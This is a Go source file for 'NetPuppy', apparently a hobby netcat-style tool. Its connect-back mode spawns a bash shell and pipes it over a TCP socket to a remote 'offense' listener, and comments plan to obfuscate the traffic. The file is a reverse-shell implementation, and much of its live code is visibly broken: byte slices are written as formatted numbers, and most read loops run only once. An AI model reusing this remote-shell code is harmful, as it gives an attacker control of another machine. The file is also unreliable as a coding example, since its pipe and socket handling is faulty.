package main

import (
	"bufio"
	"bytes"
	"errors"
	"fmt"
	"io"
	"log"
	"os"
	"os/signal"
	"time"

	// NetPuppy modules:
	"netpuppy/utils"
)

// func readFromUserShell(shellUserChannel chan<- string, stdout *io.ReadCloser, stderr *io.ReadCloser) {
// 	/*
// 		Depending on if the shell process is true on the peer struct,
// 		we have 3 go routines: 2 for if the shell is true (readStdout, readStderr)
// 		and one if it's false (readUserInput)

// 		The go routines put data they get from their sources into the channel.
// 		Think of the user and the shell as being treated the same by the peer...
// 	*/

// 	// Read data being outputed by the shell process (shell stdout):
// 	readForStdout := func(stdout *io.ReadCloser, shellUserChannel chan<- string) {
// 		// For loop checks for data in shell stdout:
// 		var readBuffer []byte = make([]byte, 1024)
// 		var numBytesRead int = 0
// 		var fullData []byte
// 		var dereferencedStdout io.ReadCloser = *stdout

// 		fmt.Printf("Stdout address in go routine = %p\n", stdout)

// 		for {
// 			// Get reader out of ReadCloser interface w/ type assertion:
// 			reader := dereferencedStdout.(io.Reader)

// 			numBytesRead, err := io.ReadFull(reader, readBuffer)
// 			if err == nil {
// 				fmt.Printf("Data read from stdout: %v\n", readBuffer)
// 				// Set chunk to data read:
// 				dataChunk := readBuffer[:numBytesRead]

// 				// Add chunk to whole
// 				fullData = append(fullData, dataChunk...)

// 				// Reset buffer:
// 				readBuffer = make([]byte, 1024)
// 				continue
// 			} else {
// 				// Check for EOF & ErrUnexpectedEOF from io package (want to continue)
// 				//....... (type assertion time)
// 				if errors.Is(err, io.EOF) {
// 					// Make sure there is something read from stderr before putting in channel:
// 					if len(fullData) > 0 {
// 						fmt.Printf("Sending into channel from stdout: %s\n", string(fullData))
// 						shellUserChannel <- string(fullData)

// 						// Reset fullData & continue:
// 						fullData = []byte{}
// 					}
// 					continue
// 				} else if errors.Is(err, io.ErrUnexpectedEOF) {
// 					// There is data in numBytesRead, add to data chunk
// 					dataChunk := readBuffer[:numBytesRead]

// 					// Add chunk to whole:
// 					fullData = append(fullData, dataChunk...)

// 					// Send down channel:
// 					fmt.Printf("Sending into channel from stdout: %s\n", string(fullData))
// 					shellUserChannel <- string(fullData)

// 					// Reset:
// 					fullData = []byte{}

// 					fmt.Println("Error is unexpected EOF (stdout)")
// 					continue
// 				} else {
// 					log.Fatalf("Error reading from Stdout: %v\n", err)
// 					break
// 				}
// 			}
// 			continue
// 		}
// 		fmt.Println(string(numBytesRead))
// 		// // Wait? (may need Cmd.Wait() here)
// 		// close channel? GRACEFULLY>!>!

// 		// for {
// 		// 	fmt.Printf("Go routin stdout for loop\n")
// 		// 	outData, err := io.ReadAll(*stdout) // Dereference the stdout pointer to get the actual value @ the address in memory
// 		// 	if err != nil {
// 		// 		fmt.Printf("Error reading data from stdout pipe: %v\n", err)
// 		// 		os.Stderr.WriteString(err.Error() + "\n")
// 		// 		os.Exit(1)
// 		// 	}
// 		// 	// If data: change to string & put into channel:
// 		// 	if len(outData) > 0 {
// 		// 		fmt.Printf("stdout: %s\n", string(outData))
// 		// 		cData := string(outData)
// 		// 		shellUserChannel <- cData
// 		// 	}
// 		// }
// 		// // Wait? (may need Cmd.Wait() here)
// 	}

// 	// Read ERROR data being outputed by the shell process (stderr):
// 	readForStderr := func(stderr *io.ReadCloser, shellUserChannel chan<- string) {
// 		// For loop checks for data in shell stderr:
// 		var readBuffer []byte = make([]byte, 1024)
// 		var numBytesRead int = 0
// 		var fullData []byte
// 		var dereferencedStderr io.ReadCloser = *stderr

// 		fmt.Printf("stderr address in go routine = %p\n", stderr)

// 		for {
// 			// Get reader out of ReadCloser interface w/ type assertion:
// 			reader := dereferencedStderr.(io.Reader)

// 			numBytesRead, err := io.ReadFull(reader, readBuffer)
// 			//numBytesRead, err := io.ReadFull(dereferencedStderr, readBuffer)
// 			if err == nil {
// 				fmt.Printf("Data red from stderr: %v\n", readBuffer)
// 				// Set chunk to data read:
// 				dataChunk := readBuffer[:numBytesRead]

// 				// Add chunk to whole
// 				fullData = append(fullData, dataChunk...)

// 				// Reset buffer:
// 				readBuffer = make([]byte, 1024)
// 				continue
// 			} else {
// 				// Check for EOF & ErrUnexpectedEOF from io package (want to continue)
// 				if errors.Is(err, io.EOF) {
// 					// Make sure there is something read from stderr before putting in channel:
// 					if len(fullData) > 0 {
// 						fmt.Printf("Sending into channel from stderr: %s\n", string(fullData))
// 						shellUserChannel <- string(fullData)

// 						// Reset fullData & continue:
// 						fullData = []byte{}
// 					}
// 					continue
// 				} else if errors.Is(err, io.ErrUnexpectedEOF) {
// 					// There is data in numBytesRead, add to data chunk
// 					dataChunk := readBuffer[:numBytesRead]

// 					// Add chunk to whole:
// 					fullData = append(fullData, dataChunk...)

// 					// Send down channel:
// 					fmt.Printf("Sending into channel from stderr: %s\n", string(fullData))
// 					shellUserChannel <- string(fullData)

// 					// Reset:
// 					fullData = []byte{}

// 					fmt.Println("Error is unexpected EOF (stderr)")
// 					continue
// 				} else {
// 					log.Fatalf("Error reading from Stderr: %v\n", err)
// 					break
// 				}
// 			}
// 			continue
// 		}
// 		fmt.Println(string(numBytesRead))
// 		// // Wait? (may need Cmd.Wait() here)
// 		// close channel? GRACEFULLY>!>!
// 	}

// 	// If there's no shell (or we're the offense peer), get data from the user instead:
// 	readForUserInput := func(reader *bufio.Reader, shellUserChannel chan<- string) {
// 		// For loop checks for input from user:
// 		for {
// 			fmt.Println("For loop for reading user input.")
// 			fmt.Print(">> ")
// 			text, _ := reader.ReadString('\n')

// 			// If there is input, put into channel:
// 			if len(text) > 0 {
// 				fmt.Printf("user: %s\n", string(text))
// 				shellUserChannel <- text
// 			}
// 		}
// 	}

// 	// If the stdout param is not nil, that means we have a shell process AND we're the connect-back peer:
// 	if stdout != nil {
// 		fmt.Printf("stdout/ stderr address in readFromUSerShell = %p/%p\n", stdout, stderr)
// 		// Start separate go routines for capturing data from the shell:
// 		go readForStderr(stderr, shellUserChannel)
// 		go readForStdout(stdout, shellUserChannel)

// 	} else { // if shellProcess is nil, then just start go routine for getting user input:
// 		var reader *bufio.Reader = bufio.NewReader(os.Stdin)
// 		go readForUserInput(reader, shellUserChannel)
// 	}
// }

// func readFromSocket(socketChannel chan<- []byte, connection utils.Socket) {
// 	/*
// 		The socketChannel is for gathering & channeling data
// 		COMING IN from the socket to this peer. NP is reading the socket
// 		here and putting the data in that channel.
// 	*/

// 	fmt.Printf("Socket address in go routine = %p\n", connection)
// 	// Read from connection socket:
// 	for {
// 		//fmt.Println("For loop for reading from socket.")
// 		dataReadFromSocket, err := connection.Read()
// 		if err != nil {
// 			// Check for timeout error on conneciton:
// 			if err.Error() == "custom timeout error" {
// 				// If the socket timed out, AND data returned, put the data in the channel
// 				if len(dataReadFromSocket) > 0 {

// 					fmt.Printf("data read from socket: %s\n", string(dataReadFromSocket))
// 					//fmt.Printf("putting into socketChannel: %s\n", string(dataReadFromSocket))
// 					socketChannel <- dataReadFromSocket
// 				}

// 				continue
// 			} else if err.Error() == "EOF" {
// 				continue
// 			} else {
// 				log.Fatalf("Error reading from socket: %v\n", err.Error())
// 			}
// 		}

// 		// fmt.Printf("For loop\n")
// 		// dataChunk, err := connection.Read()

// 		// fmt.Printf("Data chunk in readFromSocket: %s\n", string(dataChunk))
// 		// if err != nil {
// 		// 	// ERROR HERE: if there si nothing in the socket, we put things in the channel?
// 		// 	if err == io.EOF && len(dataChunk) > 0 {
// 		// 		fmt.Printf("Bytes from socket: %v\n", dataWhole)
// 		// 		socketChannel <- dataWhole
// 		// 		dataWhole = []byte{}
// 		// 		continue
// 		// 	}
// 		// 	fmt.Printf("Error reading from socket: %v\n", err)
// 		// 	os.Stderr.WriteString(err.Error())
// 		// 	os.Exit(1)
// 		// 	return
// 		// }
// 		// dataWhole = append(dataWhole, dataChunk...)

// 		// // If data is not empty:
// 		// // if len(dataBytes) > 0 {
// 		// // 	fmt.Printf("Bytes from socket: %v\n", dataBytes)
// 		// // 	socketChannel <- dataBytes
// 		// // }
// 	}
// }

func runApp(c utils.ConnectionGetter) {
	// Parse flags from user, attach to struct:
	flagStruct := utils.GetFlags()

	// Print banner:
	fmt.Printf("%s", utils.Banner())

	// Create peer instance based on user input:
	var socket utils.Socket
	// POINTER: thisPeer is a pointer to the actual instance of Peer returned by CreatePeer:
	var thisPeer *utils.Peer = utils.CreatePeer(flagStruct.Port, flagStruct.Host, flagStruct.Listen, flagStruct.Shell)
	fmt.Printf("Address of peer in main.go = %p\n", thisPeer)

	// Update user:
	var updateUserBanner string = utils.UserSelectionBanner(thisPeer.ConnectionType, thisPeer.Address, thisPeer.RPort, thisPeer.LPort)
	fmt.Println(updateUserBanner)

	// Make connection:
	if thisPeer.ConnectionType == "offense" {
		socket = c.GetConnectionFromListener(thisPeer.LPort, thisPeer.Address)
		//fmt.Printf("Socket address in main.go = %p\n", socket)
	} else {
		socket = c.GetConnectionFromClient(thisPeer.RPort, thisPeer.Address)
	}

	// Set read deadline on socket (timeout after x time while trying to read socket):
	deadlineErr := socket.SetSocketReadDeadline(300)
	if deadlineErr != nil {
		log.Fatalf("Error setting socket deadline: %v\n", deadlineErr)
	}
	fmt.Printf("Address of socket in main.go: %p\n", socket)

	// Connect socket connection to peer
	thisPeer.Connection = socket
	fmt.Printf("Address of socket on peer struct = %p\n", thisPeer.Connection)

	// If shell flag is true, start shell:
	var shell utils.BashShell
	if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
		var realShellGetter utils.RealShellGetter

		shell = realShellGetter.GetConnectBackInitiatedShell()
		fmt.Printf("Address of shell in main.go: %p\n", shell)

		// Connect shell to peer:
		// Get pointer to shell underlying interface:
		//shellPointer := shell.(*utils.RealShell)
		thisPeer.ShellProcess = shell
		fmt.Printf("address of shell on peer struct (main.go) = %p\n", thisPeer.ShellProcess)
	}

	// Update banner w/ missing port:
	// var missingPortInBanner = utils.PrintMissingPortToBanner(thisPeer.ConnectionType, thisPeer.Connection)
	// fmt.Println(missingPortInBanner)

	// Start SIGINT go routine & start channel to listen for SIGINT:
	listenForSIGINT(thisPeer)

	var stdin *io.WriteCloser
	var stdout *io.ReadCloser
	var stderr *io.ReadCloser

	channel1 := make(chan string)
	channel2 := make(chan string)

	if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
		fmt.Printf("connect back and shell\n")
		// Hook up the pipes & return pointers to them:
		stdout = thisPeer.ShellProcess.PipeStdout()
		fmt.Printf("Stdout address (main.go) = %p\n", stdout)
		derefStdout := *stdout
		defer derefStdout.Close()

		stdin = thisPeer.ShellProcess.PipeStdin()
		fmt.Printf("Stdin address (main.go) = %p\n", stdin)
		var derefStdin io.WriteCloser = *stdin
		defer derefStdin.Close()

		stderr = thisPeer.ShellProcess.PipeStderr()
		fmt.Printf("Stderr address (main.go) = %p\n", stderr)
		derefStderr := *stderr
		defer derefStderr.Close()

		// Start shell:
		erR := thisPeer.ShellProcess.StartShell()
		if erR != nil {
			log.Fatalf("Error starting shell process: %v\n", erR)
		}
		fmt.Printf("Address of shell process after start (main.go) = %p\n", thisPeer.ShellProcess)

		pipeSocketIncomingToShellStdin := func(socket utils.Socket, stdin *io.WriteCloser, channel1 chan<- string) {
			fmt.Println("Go routine pipeSocketToStdin started")
			// Make Pipe:
			streamReader, streamWriter := io.Pipe()
			defer streamWriter.Close()

			// Read from socket:
			go func() {
				dataReadFromSocket, err := socket.Read()
				if err != nil {
					// Check for timeout error on conneciton:
					if err.Error() == "custom timeout error" {
						// If the socket timed out, AND data returned, put the data in the pipe:
						if len(dataReadFromSocket) > 3 {
							fmt.Printf("data read from socket: %s\n", string(dataReadFromSocket))

							// Write data from socket to pipe (keep in byte format):
							_, erR := fmt.Fprint(streamWriter, dataReadFromSocket)
							if erR != nil {
								log.Fatalf("Error writing socket data to stdin pipe: %v\n", erR)
							}
							channel1 <- "1"
						}
					}
				}
			}()

			// Write to shell stdin:
			go func() {
				// Create buffer:
				buffer := new(bytes.Buffer)
				_, err := buffer.ReadFrom(streamReader)
				if err != nil {
					log.Fatalf("Error reading from pipe to buffer: %v\n", err)
				}

				s := buffer.String()

				deref := *stdin
				_, erR := io.WriteString(deref, s)
				if erR != nil {
					log.Fatalf("Error writing buffer to shell stdin: %v\n", erR)
				}
				channel1 <- "2"

				// Create buffer:
				//	buffer := new(bytes.Buffer)

				// Copy data in pipe to shell stdin:
				//....... get writer from stdin writecloser interface:
				// deref := *stdin
				// writer := deref.(io.Writer)

				// _, err := io.Copy(writer, streamReader)
				// if err != nil {
				// 	log.Fatalf("Error writing to shell stdin: %v\n", err)
				// }

				// _, err := buffer.ReadFrom(streamReader)
				// if err != nil {
				// 	log.Fatalf("Error reading from Socket to Shell pipe: %v\n", err)
				// }

				// fmt.Printf("Data read from pipe: %s\n", buffer.String())
			}()

		}

		pipeShellOutToSocketOutgoing := func(socket utils.Socket, stdout *io.ReadCloser, stderr *io.ReadCloser, c2 chan<- string) {

			fmt.Println("Go routine pipeStdoutToSocket started")
			// Make pipe:
			stdoutStreamReader, stdoutStreamWriter := io.Pipe()
			stderrStreamReader, stderrStreamWriter := io.Pipe()
			defer stdoutStreamWriter.Close()
			defer stderrStreamWriter.Close()

			// Create reader from stdout thru type assertion:
			derefStdout := *stdout
			stdoutReader := derefStdout.(io.Reader)

			derefStderr := *stderr
			stderrReader := derefStderr.(io.Reader)

			// Read from shell stdout, copy to pipe:
			go func() {
				var fullData []byte = []byte{}

				for {
					buffer := make([]byte, 1024)

					_, err := io.ReadFull(stdoutReader, buffer)
					if err == nil {
						//fmt.Printf("Data read from stdout: %v\n", buffer)
						// Add chunk to whole
						fullData = append(fullData, buffer...)
						continue
					} else {
						// Check for EOF & ErrUnexpectedEOF from io package (want to continue)
						//....... (type assertion time)
						if errors.Is(err, io.EOF) {
							// Make sure there is something read from stdout before putting in channel:
							if len(fullData) > 0 {
								fmt.Printf("Sending into pipe from stdout: %s\n", string(fullData))

								// Put data into pipe:
								_, err = fmt.Fprint(stdoutStreamWriter, fullData)
								if err != nil {
									log.Fatalf("Error writing stdout data to pipe: %v\n", err)
								}

								// Reset fullData & continue:
								fullData = []byte{}
							}
							break
						} else if errors.Is(err, io.ErrUnexpectedEOF) {
							// There is data in numBytesRead, add to data chunk
							// Add chunk to whole:
							fullData = append(fullData, buffer...)

							// Send into pipe:
							if len(fullData) > 0 {
								fmt.Printf("Sending into channel from stdout: %s\n", string(fullData))

								_, err = fmt.Fprint(stdoutStreamWriter, fullData)
								if err != nil {
									log.Fatalf("Error writing stdout data to pipe: %v\n", err)
								}

								// Reset:
								fullData = []byte{}
							}

							fmt.Println("Error is unexpected EOF (stdout)")
							continue
						} else {
							log.Fatalf("Error reading from Stdout: %v\n", err)
							break
						}
					}
				}
				c2 <- "stdout data put into pipe"
			}()

			// Read from shell stderr, copy to pipe:
			go func() {
				// _, err := io.Copy(stderrStreamWriter, stderrReader)
				// if err != nil {
				// 	log.Fatalf("Error copying stderr to pipe: %v\n", err)
				// }
				var fullData []byte = []byte{}

				for {
					buffer := make([]byte, 1024)

					_, err := io.ReadFull(stderrReader, buffer)
					if err == nil {
						// Add chunk to whole
						fullData = append(fullData, buffer...)
					} else {
						// Check for EOF & ErrUnexpectedEOF from io package (want to continue)
						//....... (type assertion time)
						if errors.Is(err, io.EOF) {
							// Make sure there is something read from stdout before putting in channel:
							if len(fullData) > 0 {
								fmt.Printf("Sending into pipe from stderr: %s\n", string(fullData))

								// Put data into pipe:
								_, err = fmt.Fprint(stderrStreamWriter, fullData)
								if err != nil {
									log.Fatalf("Error writing stderr data to pipe: %v\n", err)
								}

								// Reset fullData & continue:
								fullData = []byte{}
							}
							continue
						} else if errors.Is(err, io.ErrUnexpectedEOF) {
							// There is data in numBytesRead, add to data chunk
							// Add chunk to whole:
							fullData = append(fullData, buffer...)

							// Send into pipe:
							if len(fullData) > 0 {
								fmt.Printf("Sending into channel from stderr: %s\n", string(fullData))
								_, err = fmt.Fprint(stderrStreamWriter, fullData)
								if err != nil {
									log.Fatalf("Error writing stderr data to pipe: %v\n", err)
								}

								// Reset:
								fullData = []byte{}
							}

							fmt.Println("Error is unexpected EOF (stderr)")
							continue
						} else {
							log.Fatalf("Error reading from Stderr: %v\n", err)
							break
						}
					}
				}
				c2 <- "stderr data put into pipe"
			}()

			// Copy data in stdout pipe to socket:
			go func() {
				// Make Buffer:
				dataInPipeBuffer := new(bytes.Buffer)

				// Put data from pipe into buffer:
				_, err := dataInPipeBuffer.ReadFrom(stdoutStreamReader)
				if err != nil {
					log.Fatalf("Error reading from stdout pipe into buffer: %v\n", err)
				}

				// Put data into socket:
				if dataInPipeBuffer.Len() > 0 {
					fmt.Printf("Data read from stdout pipe: %s\n", dataInPipeBuffer.String())
					_, erR := socket.Write(dataInPipeBuffer.Bytes())
					if erR != nil {
						log.Fatalf("Error writing stdout to socket: %v\n", erR)
					}
				}
				c2 <- "stdout data written to socket"
			}()

			// Copy data in stderr pipe to socket:
			go func() {
				// Make buffer:
				dataInPipeBuffer := new(bytes.Buffer)

				// Put data from pipe into buffer:
				_, err := dataInPipeBuffer.ReadFrom(stderrStreamReader)
				if err != nil {
					log.Fatalf("Error reading from stderr pipe into buffer: %v\n", err)
				}

				// Put data into socket:
				if dataInPipeBuffer.Len() > 0 {
					fmt.Printf("buffer greater than0, buffer: %s\n", dataInPipeBuffer.String())
					_, erR := socket.Write(dataInPipeBuffer.Bytes())
					if erR != nil {
						log.Fatalf("Error writing stderr to socket: %v\n", erR)
					}
					c2 <- "stderr data written to socket"
				}
			}()

		}

		// socket incoming should be piped to shell stdin
		fmt.Printf("before first go routine\n")
		//channel1 := make(chan string)
		//channel2 := make(chan string)

		go pipeSocketIncomingToShellStdin(thisPeer.Connection, stdin, channel1)
		// shell out should be piped to socket
		fmt.Printf("before 2nd go routine\n")
		go pipeShellOutToSocketOutgoing(thisPeer.Connection, stdout, stderr, channel2)
	} else {
		fmt.Printf("offense")

		pipeUserInputToSocketOutgoing := func(socket utils.Socket, userReader *bufio.Reader, c3 chan<- string) {
			// Make pipe:
			fmt.Println("Go routine pipeUserInputToSocket started")
			userInputStreamReader, socketStreamWriter := io.Pipe()
			defer socketStreamWriter.Close()

			// Read user input:
			go func() {
				input, _ := userReader.ReadString('\n')

				// If there is input, write it to the pipe:
				if len(input) > 0 {
					fmt.Printf("user: %s\n", string(input))
					_, err := fmt.Fprint(socketStreamWriter, input)
					if err != nil {
						log.Fatalf("Error writing user input to pipe: %v\n", err)
					}
				}
				c3 <- "input read from user"
			}()

			// Read input from pipe and put into socket:
			go func() {
				// Make buffer:
				buffer := new(bytes.Buffer)

				// Put data from pipe into buffer:
				_, err := buffer.ReadFrom(userInputStreamReader)
				if err != nil {
					log.Fatalf("Error copying user input from pipe to buffer: %v\n", err)
				}

				// Put data in buffer into socket:
				if buffer.Len() > 0 {
					_, erR := socket.Write(buffer.Bytes())
					if erR != nil {
						log.Fatalf("Error writing user input buffer to socket: %v\n", erR)
					}
				}
				c3 <- "user input written to socket"
			}()

		}

		pipeSocketIncomingToUserPrint := func(socket utils.Socket, c4 chan<- string) {
			// Make pipe:
			fmt.Println("Go routine pipeSocketToUserOut started")
			socketReader, toUserWriter := io.Pipe()
			defer toUserWriter.Close()

			// Read from socket:
			go func() {
				// Read data in socket:
				dataReadFromSocket, err := socket.Read()
				if err != nil {
					// Check for timeout error on conneciton:
					if err.Error() == "custom timeout error" {
						// If the socket timed out, AND data returned, put the data in the pipe:
						if len(dataReadFromSocket) > 0 {
							fmt.Printf("data read from socket: %s\n", string(dataReadFromSocket))

							// Write data from socket to pipe (keep in byte format):
							_, erR := fmt.Fprint(toUserWriter, dataReadFromSocket)
							if erR != nil {
								log.Fatalf("Error writing socket data to stdin pipe: %v\n", erR)
							}
							c4 <- "data read from socket"
						}
					}
				}
			}()

			// Print to user:
			go func() {
				// Get data from pipe:
				buffer := new(bytes.Buffer)

				// Put data from pipe into buffer:
				_, err := buffer.ReadFrom(socketReader)
				if err != nil {
					log.Fatalf("Error reading pipe into buffer: %v\n", err)
				}

				// Print buffer to user:
				if buffer.Len() > 0 {

					os.Stdout.Write(buffer.Bytes())
				}
				// Put buffer into socket:
				// _, erR := socket.Write(buffer.Bytes())
				// if erR != nil {
				// 	log.Fatalf("Error writing buffer to socket: %v\n", erR)
				// }
				c4 <- "data from socket print to user"
			}()

		}
		// socket incoming should be printed to user
		//....... Create reader for user input:
		userReader := bufio.NewReader(os.Stdin)
		fmt.Printf("before 3rd go routine\n")

		//channel3 := make(chan string)
		//channel4 := make(chan string)
		go pipeUserInputToSocketOutgoing(thisPeer.Connection, userReader, channel1)
		// user input should be piped to socket outgoing
		fmt.Printf("before last go routine\n")
		go pipeSocketIncomingToUserPrint(thisPeer.Connection, channel2)
	}
	fmt.Printf("made it here")

	for {
		select {
		case c1 := <-channel1:
			fmt.Printf("channel 1: %v\n", c1)
		case c2 := <-channel2:
			fmt.Printf("channel 2: %v\n", c2)
		default:
			//fmt.Printf("timeout")
			time.Sleep(300 * time.Millisecond)
		}
	}
}

/*
	New Premise/ hypothesis
		treat both the socket and the (shell/user) as having an out and an in (pipes)
		Hypothesis:
			- If the socket, shell, and user each have an out and in, then they each
				have an io.Reader and an io.Writer (or similar)

				- In that case:
					should be able to use io.Copy or io.Pipe() to connect them
					i.e.:
						SHELL:
							stdout/stderr OR user (io.Reader) ==> socket outgoing (io.Writer)
							socket incoming (io.Reader) ==> stdin OR user in (io.Writer)

		Plan/ Implementation:
			- io.Pipe(): creates a pipe which will block until all data written to it is successfully read from it.
					Example:
						ShellOut == pipe ==> SocketIn
									&
						SocketOut == pipe ==> ShellIn
				- Go routines?
					who should be checking for data?
					need to check for:
						- data from socket?
						- data from user?
						- data from shell?

						go routine: check socket:
							not sure this is needed since Pipe() should just forward all incoming data to ShellIn

						go routine: check shell:
							Maybe also don't need? (same reason)

*/
/*



	OLD::::


*/
// // If this peer is connect-back & has a shell: get pipes for shell & start the shell process:
// if thisPeer.Shell && thisPeer.ConnectionType == "connect-back" {
// 	// Hook up the pipes & return pointers to them:
// 	stdout = thisPeer.ShellProcess.PipeStdout()
// 	fmt.Printf("Stdout address (main.go) = %p\n", stdout)
// 	derefStdout := *stdout
// 	defer derefStdout.Close()

// 	stdin = thisPeer.ShellProcess.PipeStdin()
// 	fmt.Printf("Stdin address (main.go) = %p\n", stdin)
// 	//var derefStdin io.WriteCloser = *stdin
// 	//defer derefStdin.Close()

// 	stderr = thisPeer.ShellProcess.PipeStderr()
// 	fmt.Printf("Stderr address (main.go) = %p\n", stderr)
// 	derefStderr := *stderr
// 	defer derefStderr.Close()

// 	// Start shell:
// 	erR := thisPeer.ShellProcess.StartShell()
// 	if erR != nil {
// 		log.Fatalf("Error starting shell process: %v\n", erR)
// 	}
// 	fmt.Printf("Address of shell process after start (main.go) = %p\n", thisPeer.ShellProcess)

// 	// var waitErr error = thisPeer.ShellProcess.Wait()
// 	// if waitErr != nil {
// 	// 	log.Fatalf("Error calling shell.Wait() method: %v\n", waitErr)
// 	// }

// 	// Functions to handle stderr & stdout:
// 	readFromUserShell(shellUserChannel, stdout, stderr)
// } else {
// 	// If this peer does not need a shell, start go routine to read user input:
// 	readFromUserShell(shellUserChannel, nil, nil)
// }

// // Start go routine for reading from socket:
// go readFromSocket(socketChannel, thisPeer.Connection)

// /*
// 		This for loop is where all the hacking magic happens.
// 		We use select statements to check if either channel has
// 		data in it.

// 		1) shellUserChannel: will have EITHER data from the user (input)
// 			or data from the shell process (stdout/stderr)
// 		2) socketChannel: will have data coming inbound through the socket

// 		If either has data in it, we do things to it and move on. If no data,
// 		there is a small timeout as default.

// 	TO DO":::::
// 		- send the entire commaand (or capture the entire command)
// 		- decode
// 		- fix output on target (obfuscate over the wire)
// 			- mitm....
// 			- ssh server/client in go std lib ( or non standard protocol)
// 		- io reader loop

// */
// for {
// 	//fmt.Printf("select for loop\n")
// 	select {
// 	// Read shellUserChannel and write the data to the socket:
// 	case socketOutgoing := <-shellUserChannel:
// 		if len(socketOutgoing) > 3 {
// 			fmt.Printf("Data in shell user channel: %s\n", string(socketOutgoing))
// 			_, err := thisPeer.Connection.Write([]byte(socketOutgoing))

// 			if err != nil {
// 				// Quit here?
// 				fmt.Printf("Error in userInput select: %v\n", err)
// 				os.Stderr.WriteString(" " + err.Error() + "\n")
// 			}
// 		} else {
// 			// Do we need to 'flush' the data in the channel (since there is some, but we don't want it?)
// 			socketOutgoing = string("")
// 		}

// 		// Read socketChannel & print to user OR redirect to shell process stdin:
// 	case socketIncoming := <-socketChannel:
// 		fmt.Printf("Socket incoming: %s\n", string(socketIncoming))
// 		// Convert bytes to string:
// 		sendString := string(socketIncoming)

// 		// If we have a cb shell & we're connect-back peer, data received from socket should be sent to shell stdin:
// 		if thisPeer.ConnectionType == "connect-back" && thisPeer.Shell {
// 			/*
// 				Try w/ io.Copy
// 			*/
// 			// Make reader:
// 			reader := strings.NewReader(sendString)
// 			deref := *stdin
// 			writer := deref.(io.Writer)

// 			_, err := io.Copy(writer, reader)
// 			if err != nil {
// 				log.Fatalf("Error writing socket data to shell stdin: %v\n", err)
// 			}

// 			fmt.Printf("After write to stdin")

// 			/*

// 				OLD:

// 			*/
// 			//	io.WriteString wants to defer the closer so we dereference stdin:
// 			// var dereferenceForCloseMethod io.WriteCloser = *stdin
// 			// //defer dereferenceForCloseMethod.Close()

// 			// fmt.Printf("Writing '%s' to shell stdin\n", sendString)

// 			// intReturn, err := io.WriteString(dereferenceForCloseMethod, sendString)
// 			// if err != nil {
// 			// 	log.Fatalf("Error writing to stdin: %v\n", err)
// 			// }
// 			// fmt.Printf("Intreturn from stdin write: %d\n", intReturn)

// 			// go func(dereferenceForCloseMethod io.WriteCloser, s string) {
// 			// 	// Write socket data to shell stdin:
// 			// 	//defer dereferenceForCloseMethod.Close()
// 			// 	_, err := io.WriteString(dereferenceForCloseMethod, s)
// 			// 	if err != nil {
// 			// 		log.Fatalf("Error writing socket data to shell stdin (main.go): %v\n", err)
// 			// 	}
// 			// }(dereferenceForCloseMethod, sendString)

// 		} else {
// 			// Print data from socket channel to user:
// 			_, err := os.Stdout.Write(socketIncoming)
// 			if err != nil {
// 				// Quit here?
// 				fmt.Printf("Error in writing to stdout (main.go): %v\n", err)
// 				os.Stderr.WriteString(" " + err.Error() + "\n")
// 			}
// 		}
// 	default:
// 		time.Sleep(300 * time.Millisecond)
// 	}
// }
//}

func listenForSIGINT(thisPeer *utils.Peer) { // POINTER: passing Peer by reference (we ACTUALLY want to close it)
	// If SIGINT: close connection, exit w/ code 2
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	go func() {
		for sig := range signalChan {
			if sig.String() == "interrupt" {
				fmt.Printf("signal: %v\n", sig)
				thisPeer.Connection.Close()
				os.Exit(2)
			}
		}
	}()
}

func main() {
	// In order to test the connection code w/o creating REAL sockets, runApp() handles most of the logic:
	var realConnection utils.RealConnectionGetter
	runApp(realConnection)
}
